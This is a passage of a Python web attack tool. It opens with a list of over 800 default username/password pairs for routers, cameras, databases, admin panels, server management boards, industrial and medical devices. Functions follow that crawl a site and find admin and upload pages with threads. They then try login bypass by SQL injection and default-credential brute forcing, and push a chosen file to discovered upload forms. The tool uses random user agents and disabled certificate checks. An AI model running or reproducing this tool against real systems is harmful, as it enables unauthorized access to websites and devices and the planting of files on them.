    ("admin", "admin@123"), ("admin", "Admin@123"), ("admin", "admin123!"),
    ("admin", "admin1234"), ("admin", "adminadmin"), ("admin", "administrator"),
    ("admin", "root"), ("admin", "toor"), ("admin", "nimda"),
    ("admin", "master"), ("admin", "super"), ("admin", "superuser"),
    ("admin", "support"), ("admin", "tech"), ("admin", "system"),
    ("admin", "manager"), ("admin", "operator"), ("admin", "backup"),
    ("admin", "temp"), ("admin", "temp123"), ("admin", "qwerty"),
    ("admin", "abc123"), ("admin", "12345678"), ("admin", "123456789"),
    ("admin", "123123"), ("admin", "123321"), ("admin", "111111"),
    ("admin", "222222"), ("admin", "333333"), ("admin", "444444"),
    ("admin", "555555"), ("admin", "666666"), ("admin", "777777"),
    ("admin", "888888"), ("admin", "999999"), ("admin", "000000"),
    ("admin", "1qaz2wsx"), ("admin", "1qazxsw2"), ("admin", "qazwsx"),
    ("admin", "qwertyuiop"), ("admin", "asdfgh"), ("admin", "zxcvbnm"),
    ("admin", "!@#$%^"), ("admin", "!@#$%^&*"), ("admin", "zaq1xsw2"),
    ("admin", "1qaz@WSX"), ("admin", "q1w2e3r4"), ("admin", "P@55w0rd"),
    ("admin", "Password123!"), ("admin", "passw0rd"),

    # Administrator variations
    ("administrator", "administrator"), ("administrator", "admin"),
    ("administrator", "password"), ("administrator", "123456"),
    ("administrator", "12345"), ("administrator", "1234"),
    ("administrator", "123"), ("administrator", ""),
    ("administrator", "changeme"), ("administrator", "letmein"),
    ("administrator", "default"), ("administrator", "root"),
    ("administrator", "toor"), ("administrator", "admin123"),
    ("administrator", "Administrator"), ("administrator", "administrator1"),
    ("administrator", "Admin"), ("administrator", "ADMIN"),

    # Root
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "123456"), ("root", "12345"), ("root", "1234"),
    ("root", "123"), ("root", "12"), ("root", "1"), ("root", "0"),
    ("root", ""), ("root", " "), ("root", "changeme"), ("root", "default"),
    ("root", "letmein"), ("root", "root123"), ("root", "rootpass"),
    ("root", "rootpwd"), ("root", "r00t"), ("root", "r00t123"),
    ("root", "toor123"), ("root", "admin"), ("root", "administrator"),
    ("root", "qwerty"), ("root", "abc123"), ("root", "12345678"),
    ("root", "111111"), ("root", "000000"), ("root", "master"),
    ("root", "super"), ("root", "system"), ("root", "manager"),
    ("root", "!@#$"), ("root", "passwd"), ("root", "password1"),

    # User
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("user", "12345"), ("user", "1234"), ("user", "123"),
    ("user", "12"), ("user", "1"), ("user", "0"), ("user", ""),
    ("user", "changeme"), ("user", "default"), ("user", "letmein"),
    ("user", "user123"), ("user", "userpass"), ("user", "guest"),

    # Guest
    ("guest", "guest"), ("guest", "password"), ("guest", "123456"),
    ("guest", "12345"), ("guest", "1234"), ("guest", "123"),
    ("guest", ""), ("guest", "changeme"), ("guest", "default"),
    ("guest", "letmein"), ("guest", "guest123"),

    # Test
    ("test", "test"), ("test", "password"), ("test", "123456"),
    ("test", "12345"), ("test", "1234"), ("test", "123"),
    ("test", ""), ("test", "changeme"), ("test", "default"),
    ("test", "letmein"), ("test", "test123"), ("test", "testuser"),

    # ------------------------------------------------------------
    # Network Devices (Routers, Switches, Firewalls, Access Points)
    # ------------------------------------------------------------
    # Cisco
    ("cisco", "cisco"), ("cisco", "password"), ("cisco", "cisco123"),
    ("cisco", "router"), ("cisco", "enable"), ("cisco", "class"),
    ("cisco", "sanfran"), ("cisco", "cisco!123"), ("cisco", ""),
    ("enable", "enable"), ("enable", "cisco"), ("enable", "password"),
    ("admin", "cisco"), ("admin", "router"), ("admin", "switch"),
    ("admin", "ap"), ("root", "cisco"), ("root", "router"),

    # Ubiquiti / UniFi
    ("ubnt", "ubnt"), ("root", "ubnt"), ("admin", "ubnt"),
    ("ubnt", ""), ("admin", "ubiquiti"), ("ubnt", "ubiquiti"),
    ("ubnt", "password"), ("ubnt", "UBNT"),

    # MikroTik
    ("admin", ""), ("admin", "admin"), ("admin", "1234"),
    ("admin", "password"), ("admin", "default"), ("admin", "mikrotik"),
    ("root", ""), ("root", "mikrotik"), ("mikrotik", "mikrotik"),

    # Linksys
    ("linksys", "linksys"), ("admin", "linksys"), ("admin", "password"),
    ("admin", "admin"), ("admin", "1234"), ("admin", "wireless"),
    ("root", "linksys"), ("root", "admin"), ("user", "linksys"),

    # Netgear
    ("netgear", "netgear"), ("admin", "netgear"), ("admin", "password"),
    ("admin", "1234"), ("admin", "12345678"), ("admin", "netgear123"),
    ("admin", "gear"), ("root", "netgear"), ("user", "netgear"),

    # D-Link
    ("dlink", "dlink"), ("admin", "dlink"), ("admin", "d-link"),
    ("admin", "1234"), ("admin", "password"), ("admin", "public"),
    ("admin", "private"), ("user", "dlink"), ("dlink", "admin"),
    ("root", "dlink"), ("admin", "dlink123"),

    # TP-Link
    ("tp-link", "tp-link"), ("admin", "tp-link"), ("admin", "tplink"),
    ("admin", "tplink123"), ("admin", "tplinkadmin"), ("admin", "password"),
    ("admin", "1234"), ("root", "tp-link"), ("user", "tp-link"),
    ("admin", "tplink"), ("admin", "tplinkwifi"),

    # Asus
    ("asus", "asus"), ("admin", "asus"), ("admin", "asusadmin"),
    ("admin", "password"), ("admin", "1234"), ("admin", "admin"),
    ("root", "asus"), ("root", "admin"),

    # Belkin
    ("belkin", "belkin"), ("admin", "belkin"), ("admin", "belkin123"),
    ("admin", "password"), ("admin", "1234"), ("admin", "admin"),

    # Zyxel
    ("zyxel", "zyxel"), ("admin", "zyxel"), ("admin", "1234"),
    ("admin", "password"), ("admin", "admin"), ("root", "zyxel"),

    # Huawei
    ("huawei", "huawei"), ("admin", "huawei"), ("admin", "123456"),
    ("admin", "password"), ("admin", "admin"), ("root", "huawei"),
    ("root", "admin"), ("user", "huawei"),

    # ISP / Cable modems
    ("admin", "verizon"), ("admin", "att"), ("admin", "comcast"),
    ("admin", "xfinity"), ("admin", "bell"), ("admin", "rogers"),
    ("admin", "telus"), ("admin", "optus"), ("admin", "telstra"),
    ("admin", "sky"), ("admin", "virgin"), ("admin", "vodafone"),
    ("admin", "o2"), ("admin", "telenet"), ("admin", "swisscom"),
    ("admin", "deutschetelekom"), ("admin", "telecom"), ("admin", "cable"),

    # Arris / Motorola
    ("admin", "motorola"), ("admin", "arris"), ("admin", "password"),
    ("admin", "1234"), ("admin", "default"), ("root", "arris"),
    ("root", "motorola"), ("user", "arris"),

    # Technicolor / Thomson
    ("admin", "technicolor"), ("admin", "thomson"), ("admin", "password"),
    ("admin", "1234"), ("admin", "admin"), ("user", "user"),

    # Fortinet
    ("admin", ""), ("admin", "admin"), ("admin", "password"),
    ("root", ""), ("root", "admin"), ("root", "fortinet"),

    # Palo Alto
    ("admin", "admin"), ("admin", ""), ("admin", "paloalto"),

    # SonicWALL
    ("admin", "password"), ("admin", "admin"), ("admin", "sonicwall"),

    # Check Point
    ("admin", "admin"), ("admin", "cp"), ("admin", "checkpoint"),

    # Juniper
    ("root", "juniper"), ("root", ""), ("admin", "juniper"),
    ("admin", "password"), ("admin", "juniper123"),

    # ------------------------------------------------------------
    # Cameras, IoT, DVR, NVR
    # ------------------------------------------------------------
    ("admin", "1111"), ("admin", "2222"), ("admin", "3333"),
    ("admin", "4444"), ("admin", "5555"), ("admin", "6666"),
    ("admin", "7777"), ("admin", "8888"), ("admin", "9999"),
    ("admin", "0000"), ("admin", "123456"), ("admin", "12345"),
    ("admin", "1234"), ("admin", "123"), ("admin", "password"),
    ("admin", "pass"), ("admin", "private"), ("admin", "public"),
    ("admin", "ipcam"), ("admin", "camera"), ("admin", "dvr"),
    ("admin", "nvr"), ("admin", "hikvision"), ("admin", "hki"),
    ("admin", "hik123"), ("admin", "hik"), ("admin", "hikvision123"),
    ("admin", "hik12345"), ("root", "hikvision"), ("root", "hik"),
    ("admin", "dahua"), ("admin", "dahua123"), ("admin", "dahua1234"),
    ("admin", "dahuacamera"), ("root", "dahua"), ("admin", "axis"),
    ("root", "axis"), ("root", "pass"), ("root", "123456"),
    ("admin", "acti"), ("admin", "acti123"), ("admin", "arecont"),
    ("admin", "bosch"), ("admin", "bosch123"), ("admin", "flir"),
    ("admin", "flir123"), ("admin", "geovision"), ("admin", "geovision123"),
    ("admin", "honeywell"), ("admin", "honeywell123"), ("admin", "panasonic"),
    ("admin", "panasonic123"), ("admin", "pelco"), ("admin", "pelco123"),
    ("admin", "samsung"), ("admin", "samsung123"), ("admin", "sanyo"),
    ("admin", "sanyo123"), ("admin", "sony"), ("admin", "sony123"),
    ("admin", "vivotek"), ("admin", "vivotek123"), ("admin", "vivotek"),
    ("admin", "jvc"), ("admin", "jvc123"), ("admin", "toshiba"),
    ("admin", "toshiba123"), ("admin", "lg"), ("admin", "lg123"),
    ("admin", "smartthings"), ("admin", "smartthings123"), ("admin", "nest"),
    ("admin", "nest123"), ("admin", "ring"), ("admin", "ring123"),

    # ------------------------------------------------------------
    # Printers (HP, Canon, Epson, Brother, etc.)
    # ------------------------------------------------------------
    ("admin", "hp"), ("admin", "hp123"), ("admin", "hpprint"),
    ("admin", "hp printer"), ("admin", "hp01"), ("admin", "hpinvent"),
    ("admin", "hpadmin"), ("root", "hp"), ("root", "hp123"),
    ("admin", "canon"), ("admin", "canon123"), ("admin", "canon0"),
    ("admin", "canonbj"), ("admin", "epson"), ("admin", "epson123"),
    ("admin", "epson0"), ("admin", "brother"), ("admin", "brother123"),
    ("admin", "brother0"), ("admin", "lexmark"), ("admin", "lexmark123"),
    ("admin", "xerox"), ("admin", "xerox123"), ("admin", "xerox01"),
    ("admin", "ricoh"), ("admin", "ricoh123"), ("admin", "ricoh01"),
    ("admin", "konica"), ("admin", "konica123"), ("admin", "minolta"),
    ("admin", "kyocera"), ("admin", "kyocera123"), ("admin", "okidata"),
    ("admin", "okidata123"), ("admin", "sharp"), ("admin", "sharp123"),
    ("admin", "fuji"), ("admin", "fuji123"), ("admin", "fujixerox"),
    ("admin", "fujixerox123"),

    # ------------------------------------------------------------
    # Databases
    # ------------------------------------------------------------
    # Oracle
    ("oracle", "oracle"), ("oracle", "password"), ("oracle", "tiger"),
    ("oracle", "oracle123"), ("system", "manager"), ("system", "oracle"),
    ("sys", "change_on_install"), ("sys", "manager"), ("sys", "oracle"),
    ("dbsnmp", "dbsnmp"), ("scott", "tiger"), ("scott", "password"),
    ("scott", "scott"), ("hr", "hr"), ("hr", "password"),

    # MySQL / MariaDB
    ("root", ""), ("root", "root"), ("root", "password"), ("root", "123456"),
    ("root", "mysql"), ("root", "mariadb"), ("mysql", ""), ("mysql", "mysql"),
    ("mysql", "password"), ("admin", ""), ("admin", "mysql"),

    # PostgreSQL
    ("postgres", ""), ("postgres", "postgres"), ("postgres", "password"),
    ("postgres", "123456"), ("postgres", "admin"), ("postgres", "postgresql"),
    ("admin", "postgres"), ("admin", "postgresql"),

    # Microsoft SQL Server
    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "123456"),
    ("sa", "Password123"), ("sa", "admin"), ("sa", "sql"), ("sa", "sqlserver"),
    ("sa", "mssql"), ("mssql", "mssql"), ("mssql", "password"),
    ("admin", "mssql"),

    # MongoDB
    ("mongodb", ""), ("mongodb", "mongodb"), ("mongodb", "password"),
    ("admin", "mongodb"), ("admin", ""), ("root", "mongodb"),
    ("root", ""), ("root", "mongodb123"),

    # Cassandra
    ("cassandra", "cassandra"), ("cassandra", ""), ("cassandra", "cassandra123"),
    ("cassandra", "password"),

    # Redis
    ("default", ""), ("default", "redis"), ("default", "password"),
    ("redis", ""), ("redis", "redis"), ("redis", "password"),

    # Elasticsearch
    ("elastic", ""), ("elastic", "elastic"), ("elastic", "password"),
    ("elastic", "changeme"), ("admin", "elastic"),

    # InfluxDB
    ("admin", "admin"), ("admin", ""), ("admin", "influxdb"),
    ("root", "root"), ("root", "influxdb"),

    # CouchDB
    ("admin", "admin"), ("admin", ""), ("admin", "couchdb"),

    # ------------------------------------------------------------
    # Web Applications / CMS / Admin Panels
    # ------------------------------------------------------------
    # WordPress
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "wordpress"), ("admin", "wp"), ("admin", "wpadmin"),
    ("admin", "wp123"), ("wp", "wp"), ("wpadmin", "wpadmin"),

    # Joomla
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "joomla"), ("admin", "joomla123"), ("root", "joomla"),

    # Drupal
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "drupal"), ("admin", "drupal123"),

    # Magento
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "magento"), ("admin", "magento123"),

    # phpMyAdmin
    ("root", ""), ("root", "root"), ("root", "password"),
    ("root", "123456"), ("admin", ""), ("admin", "admin"),
    ("admin", "phpmyadmin"), ("pma", "pma"),

    # Tomcat
    ("tomcat", "tomcat"), ("tomcat", "admin"), ("tomcat", "password"),
    ("admin", "tomcat"), ("both", "tomcat"), ("role1", "role1"),
    ("role1", "tomcat"), ("manager", "manager"), ("manager", "tomcat"),

    # Jenkins
    ("jenkins", "jenkins"), ("admin", "jenkins"), ("jenkins", "password"),
    ("admin", "admin"), ("admin", ""), ("jenkins", "admin"),

    # GitLab / GitHub (self-hosted)
    ("root", "root"), ("root", "password"), ("root", "123456"),
    ("admin", "admin"), ("admin", "password"), ("admin", "gitlab"),

    # JIRA / Confluence
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "jira"), ("admin", "confluence"),

    # Kibana
    ("elastic", "changeme"), ("kibana", "kibana"), ("kibana", ""),

    # Grafana
    ("admin", "admin"), ("admin", "password"), ("admin", "grafana"),

    # SonarQube
    ("admin", "admin"), ("admin", "sonar"), ("admin", "sonarqube"),

    # RabbitMQ
    ("guest", "guest"), ("admin", "admin"), ("admin", "rabbitmq"),

    # ActiveMQ
    ("admin", "admin"), ("admin", "activemq"), ("user", "user"),

    # Node-RED
    ("admin", "admin"), ("admin", "password"), ("admin", "node-red"),

    # Home Assistant
    ("admin", "admin"), ("admin", "password"), ("admin", "homeassistant"),

    # OpenVPN
    ("admin", "admin"), ("admin", "password"), ("admin", "openvpn"),

    # Pi-hole
    ("admin", "admin"), ("admin", "password"), ("admin", "pihole"),

    # ------------------------------------------------------------
    # Operating Systems & Remote Management
    # ------------------------------------------------------------
    # Windows (local admin, RDP)
    ("Administrator", ""), ("Administrator", "password"), ("Administrator", "admin"),
    ("Administrator", "123456"), ("Administrator", "12345"), ("Administrator", "1234"),
    ("Administrator", "123"), ("Administrator", "Administrator"), ("Administrator", "Admin"),
    ("Administrator", "P@ssw0rd"), ("Administrator", "Passw0rd"), ("Administrator", "Password1"),
    ("Administrator", "administrator"), ("admin", ""), ("admin", "admin"),
    ("admin", "password"), ("admin", "123456"), ("admin", "P@ssw0rd"),

    # Linux (common user accounts)
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "123456"),
    ("root", "changeme"), ("root", "default"), ("root", "letmein"),
    ("root", "root123"), ("root", "r00t"), ("root", "rootpass"),

    # VMware ESXi / vCenter
    ("root", ""), ("root", "root"), ("root", "password"), ("root", "123456"),
    ("root", "vmware"), ("root", "esxi"), ("root", "vmw@re"),
    ("admin", "vmware"), ("admin", "admin"), ("admin", "password"),

    # Citrix
    ("root", "root"), ("root", "password"), ("admin", "admin"),

    # Dell iDRAC / iDRAC9
    ("root", "calvin"), ("root", "root"), ("root", "password"),
    ("admin", "admin"), ("admin", "calvin"), ("admin", "password"),

    # HP iLO
    ("admin", "admin"), ("admin", "password"), ("admin", "ilo"),
    ("admin", "hpinvent"), ("root", "hpinvent"), ("root", "ilo"),

    # Lenovo XClarity
    ("admin", "admin"), ("admin", "password"), ("admin", "lenovo"),

    # Supermicro BMC
    ("admin", "admin"), ("admin", "password"), ("root", "root"),
    ("root", "calvin"),

    # ------------------------------------------------------------
    # Embedded / Special / Misc
    # ------------------------------------------------------------
    # Raspberry Pi
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("pi", ""),
    ("pi", "password"), ("pi", "raspberry123"), ("root", "raspberry"),

    # Arduino / IoT boards
    ("admin", "arduino"), ("arduino", "arduino"), ("root", "arduino"),

    # Network storage (NAS)
    ("admin", "nas"), ("admin", "synology"), ("admin", "qnap"),
    ("admin", "wd"), ("admin", "wdhc"), ("admin", "mycloud"),
    ("admin", "buffalo"), ("admin", "buffalo123"), ("admin", "thecus"),
    ("admin", "seagate"), ("admin", "seagate123"),

    # IPMI / BMC
    ("admin", "admin"), ("admin", "password"), ("root", "root"),
    ("root", "calvin"), ("root", "ipmi"), ("admin", "ipmi"),

    # Industrial control / PLC
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "password"), ("user", "user"),

    # VoIP / PBX
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "asterisk"), ("admin", "freepbx"), ("admin", "elastix"),
    ("root", "asterisk"), ("root", "freepbx"), ("user", "user"),

    # Game servers / consoles
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "password"), ("user", "user"),

    # Smart home hubs
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "smartthings"), ("admin", "wink"), ("admin", "alexa"),
    ("admin", "googlehome"),

    # Time & attendance systems
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "attendance"), ("user", "user"),

    # KVM switches
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "password"),

    # Access control systems
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("user", "user"), ("user", "123456"),

    # HVAC / Building automation
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "password"),

    # Medical devices (use with extreme caution and authorization)
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("user", "user"), ("user", "password"),

    # -------------------------------------------------------------------
    # Blank / Null / Space combinations (often overlooked)
    # -------------------------------------------------------------------
    ("admin", ""), ("root", ""), ("user", ""), ("guest", ""), ("test", ""),
    ("", ""), ("", "admin"), ("", "password"), ("", "123456"), ("", "root"),
    ("", "user"), ("", "guest"), ("", "test"), ("admin", " "), ("root", " "),
    ("user", " "), ("guest", " "), ("test", " "), ("admin", "(null)"),
    ("root", "(null)"), ("admin", "null"), ("root", "null"), ("admin", "none"),
    ("root", "none"), ("admin", "blank"), ("root", "blank"), ("admin", "empty"),
    ("root", "empty"), ("admin", "undefined"), ("root", "undefined"),
    ("admin", "na"), ("root", "na"),

    # -------------------------------------------------------------------
    # Additional weak passwords (numbers, simple words)
    # -------------------------------------------------------------------
    ("admin", "asdf"), ("admin", "asdfgh"), ("admin", "zxcv"),
    ("admin", "zxcvbn"), ("admin", "qwer"), ("admin", "qwert"),
    ("admin", "qwertz"), ("admin", "q1w2e3"), ("admin", "1qaz"),
    ("admin", "2wsx"), ("admin", "3edc"), ("admin", "4rfv"),
    ("admin", "5tgb"), ("admin", "6yhn"), ("admin", "7ujm"),
    ("admin", "8ik,"), ("admin", "9ol."), ("admin", "0p;/"),
    ("admin", "12qwas"), ("admin", "123qwe"), ("admin", "1234qwer"),
    ("admin", "qwe123"), ("admin", "asd123"), ("admin", "zxc123"),
    ("admin", "1qaz@WSX"), ("admin", "zaq1xsw2"), ("admin", "1qazxsw2"),
    ("admin", "zaq1"), ("admin", "xsw2"), ("admin", "cde3"),

    ("root", "asdf"), ("root", "qwerty"), ("root", "123qwe"),
    ("root", "qwe123"), ("root", "asd123"), ("root", "zxc123"),

    # -------------------------------------------------------------------
    # Service accounts and daemons
    # -------------------------------------------------------------------
    ("ftp", "ftp"), ("ftp", "password"), ("ftp", "anonymous"),
    ("anonymous", "anonymous"), ("anonymous", ""), ("anon", "anon"),
    ("anon", ""), ("nobody", "nobody"), ("nobody", ""), ("daemon", "daemon"),
    ("bin", "bin"), ("sys", "sys"), ("sync", "sync"), ("mail", "mail"),
    ("news", "news"), ("uucp", "uucp"), ("operator", "operator"),
    ("games", "games"), ("gopher", "gopher"), ("ftpuser", "ftpuser"),
    ("www-data", "www-data"), ("www", "www"), ("apache", "apache"),
    ("nginx", "nginx"), ("httpd", "httpd"), ("web", "web"), ("webmaster", "webmaster"),
]

# Total entries: over 800 (count may vary slightly)

# -------------------- Link Discovery --------------------
def discover_links(base_url, max_pages=30):
    """Crawl the website and collect all internal links."""
    print_info(f"Starting link discovery on {base_url}")
    visited = set()
    to_visit = [base_url.rstrip('/')]
    all_links = set()
    headers = {'User-Agent': get_random_ua()}

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        if url in visited:
            continue
        visited.add(url)

        try:
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href'].strip()
                full_url = urllib.parse.urljoin(url, href)
                # Keep internal links only
                if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(base_url).netloc:
                    if full_url not in all_links:
                        all_links.add(full_url)
                        if full_url not in visited and full_url not in to_visit:
                            to_visit.append(full_url)
        except Exception as e:
            print_warning(f"Error visiting {url}: {e}")

    print_success(f"Discovered {len(all_links)} internal links:")
    for link in sorted(all_links):
        print(f"  {GREEN}{link}{RESET}")
    return all_links

# -------------------- Admin Page Finder (Threaded) --------------------
def check_admin_path(base_url, path):
    """Check a single admin path."""
    url = urllib.parse.urljoin(base_url, path)
    headers = {'User-Agent': get_random_ua()}
    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if response.status_code == 200:
            return ("success", url)
        elif response.status_code in [301, 302, 403, 401]:
            return ("possible", f"{url} (Status: {response.status_code})")
    except Exception:
        pass
    return None

def find_admin_pages(base_url):
    """Scan for admin/login pages using threads."""
    print_info(f"Scanning for admin/login pages on {base_url}")
    found = []
    possible = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_admin_path, base_url, path): path for path in ADMIN_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if result:
                if result[0] == "success":
                    found.append(result[1])
                    print_success(f"Found: {result[1]}")
                else:
                    possible.append(result[1])
                    print_warning(f"Possible: {result[1]}")

    if not found and not possible:
        print_warning("No admin/login pages found.")
    else:
        if found:
            print_success(f"Total {len(found)} admin/login pages found (confirmed).")
        if possible:
            print_warning(f"Total {len(possible)} possible admin/login pages found.")
    return found + possible

# -------------------- Uploader Page Finder (Threaded) --------------------
def check_upload_path(base_url, path):
    """Check a single upload path for file input."""
    url = urllib.parse.urljoin(base_url, path)
    headers = {'User-Agent': get_random_ua()}
    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                if form.find('input', {'type': 'file'}):
                    # Ensure proper enctype (if present, it should be multipart)
                    enctype = form.get('enctype', '')
                    if 'multipart/form-data' in enctype or not enctype:
                        return url
    except Exception:
        pass
    return None

def find_uploader_pages(base_url):
    """Scan for file upload pages using threads."""
    print_info(f"Scanning for file upload pages on {base_url}")
    found = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_upload_path, base_url, path): path for path in UPLOAD_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                print_success(f"Upload form found at: {result}")

    if not found:
        print_warning("No upload pages found.")
    else:
        print_success(f"Total {len(found)} upload pages found.")
    return found

# -------------------- Login Bypass (Enhanced) --------------------
def identify_login_fields(soup):
    """Identify username and password fields from a login form."""
    form = soup.find('form')
    if not form:
        return None, None, None, {}

    inputs = form.find_all('input')
    username_field = None
    password_field = None
    other_fields = {}

    # Heuristics for username field
    username_keywords = ['user', 'name', 'login', 'email', 'log', 'username', 'uname', 'usr', 'nick', 'handle']
    password_keywords = ['pass', 'pwd', 'password', 'secret', 'passwd', 'passcode', 'pin']

    for inp in inputs:
        name = inp.get('name')
        if not name:
            continue
        inp_type = inp.get('type', 'text').lower()
        if inp_type == 'password':
            password_field = name
        elif inp_type in ('text', 'email') and any(kw in name.lower() for kw in username_keywords):
            username_field = name
        elif inp_type == 'hidden':
            other_fields[name] = inp.get('value', '')
        else:
            # Store default value if present
            other_fields[name] = inp.get('value', '')

    # Fallback: first text field as username, first password as password
    if not username_field:
        for inp in inputs:
            name = inp.get('name')
            if name and inp.get('type') in ('text', 'email'):
                username_field = name
                break
    if not password_field:
        for inp in inputs:
            name = inp.get('name')
            if name and inp.get('type') == 'password':
                password_field = name
                break

    return form, username_field, password_field, other_fields

def login_bypass(login_url):
    """Attempt to bypass login using SQLi and default credentials."""
    print_info(f"Attempting login bypass on {login_url}")

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        response = session.get(login_url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')

        form, username_field, password_field, other_fields = identify_login_fields(soup)
        if not form or not username_field or not password_field:
            print_error("Could not identify login form or username/password fields.")
            return

        form_action = form.get('action')
        post_url = urllib.parse.urljoin(login_url, form_action) if form_action else login_url

        print_info(f"Form action: {post_url}")
        print_info(f"Username field: {username_field}, Password field: {password_field}")

        successful_bypasses = []

        # Try SQLi payloads
        print_info("Trying SQL injection payloads...")
        for user_payload, pass_payload in SQLI_PAYLOADS:
            data = {username_field: user_payload, password_field: pass_payload}
            data.update(other_fields)
            try:
                resp = session.post(post_url, data=data, timeout=10, verify=False, allow_redirects=False)
                # Check for success indicators
                if resp.status_code in [302, 303] or 'location' in resp.headers:
                    successful_bypasses.append(f"SQLi: {user_payload} / {pass_payload} (redirect)")
                    print_success(f"Bypass possible with SQLi: {user_payload}")
                elif any(word in resp.text.lower() for word in ['welcome', 'dashboard', 'logout', 'admin', 'profile']):
                    successful_bypasses.append(f"SQLi: {user_payload} / {pass_payload} (keyword in response)")
                    print_success(f"Bypass possible with SQLi: {user_payload}")
            except Exception:
                pass

        # Try default credentials
        print_info("Trying default credentials...")
        for user, pwd in DEFAULT_CREDS:
            data = {username_field: user, password_field: pwd}
            data.update(other_fields)
            try:
                resp = session.post(post_url, data=data, timeout=10, verify=False, allow_redirects=False)
                if resp.status_code in [302, 303] or 'location' in resp.headers:
                    successful_bypasses.append(f"Default creds: {user}:{pwd} (redirect)")
                    print_success(f"Login successful with {user}:{pwd}")
                elif any(word in resp.text.lower() for word in ['welcome', 'dashboard', 'logout', 'admin', 'profile']):
                    successful_bypasses.append(f"Default creds: {user}:{pwd} (keyword in response)")
                    print_success(f"Login successful with {user}:{pwd}")
            except Exception:
                pass

        if successful_bypasses:
            print_banner("Successful Bypass Methods")
            for method in successful_bypasses:
                print(f"  {GREEN}{method}{RESET}")
        else:
            print_warning("No bypass methods succeeded.")

    except Exception as e:
        print_error(f"Error during bypass: {e}")

# -------------------- File Upload (Enhanced) --------------------
def file_upload(upload_url):
    """Interactive file upload with detection of allowed types and multiple fields."""
    print_info(f"Preparing to upload file to {upload_url}")

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        response = session.get(upload_url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', attrs={'enctype': 'multipart/form-data'}) or soup.find('form')
        if not form:
            print_error("No form found on the page.")
            return

        # Find all file inputs
        file_inputs = form.find_all('input', {'type': 'file'})
        if not file_inputs:
            print_error("No file input field found.")
            return

        # Use the first file input
        file_input = file_inputs[0]
        field_name = file_input.get('name')
        if not field_name:
            print_error("File input has no name attribute.")
            return

        # Detect allowed types from accept attribute
        accept = file_input.get('accept', '')
        allowed_exts = []
        if accept:
            for part in accept.split(','):
                part = part.strip().lower()
                if part.startswith('.'):
                    allowed_exts.append(part)
                elif '/' in part:
                    # Convert MIME type to common extension
                    ext = part.split('/')[-1]
                    if ext != '*':
                        allowed_exts.append(f".{ext}")
            print_info(f"Form accepts file types: {accept}")

        # Collect other form fields (hidden, etc.)
        other_fields = {}
        for inp in form.find_all('input'):
            name = inp.get('name')
            if not name or inp.get('type') == 'file':
                continue
            other_fields[name] = inp.get('value', '')

        form_action = form.get('action')
        post_url = urllib.parse.urljoin(upload_url, form_action) if form_action else upload_url

        print_info(f"Upload URL: {post_url}")
        print_info(f"File field name: {field_name}")

        # Prompt user for file path
        while True:
            file_path = input(f"{CYAN}Enter full path to file (e.g., /sdcard/music.mp3): {RESET}").strip()
            if not os.path.isfile(file_path):
                print_error("File not found. Please try again.")
                continue

            # Check extension against allowed list
            if allowed_exts:
                ext = os.path.splitext(file_path)[1].lower()
                if ext and ext not in allowed_exts:
                    print_warning(f"File extension {ext} may not be allowed (allowed: {allowed_exts}).")
                    cont = input(f"{YELLOW}Continue anyway? (y/N): {RESET}").strip().lower()
                    if cont != 'y':
                        continue
            break

        # Read file
        with open(file_path, 'rb') as f:
            file_data = f.read()
        filename = os.path.basename(file_path)

        # Prepare multipart form data
        files = {field_name: (filename, file_data)}
        data = other_fields

        print_info("Uploading file...")
        try:
            upload_response = session.post(post_url, files=files, data=data, timeout=30, verify=False)
            print_success("Upload completed.")
            print_info(f"Response status: {upload_response.status_code}")
            print_info("Response preview (first 500 characters):")
            print(upload_response.text[:500])
        except Exception as e:
            print_error(f"Upload failed: {e}")

    except Exception as e:
        print_error(f"Error accessing upload page: {e}")
